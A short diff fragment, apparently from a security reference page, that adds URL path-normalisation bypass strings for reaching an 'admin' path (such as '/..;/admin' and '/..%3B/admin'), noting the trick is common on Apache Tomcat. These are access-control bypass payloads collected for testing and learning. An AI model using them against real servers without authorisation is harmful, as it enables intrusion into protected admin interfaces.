@@ -15,6 +15,12 @@ admin/ <br>
 admin/*/ <br> 
 admin/..;/ <br>
 admin/..%3B/ <br> 
+/*admin <br>
+/%2fadmin/ <br>
+/./admin <br>
+/*/admin <br> 
+/..;/admin <br>
+/..%3B/admin <br> 
 <br>
 This is common on Apache Tomcat <br>
 
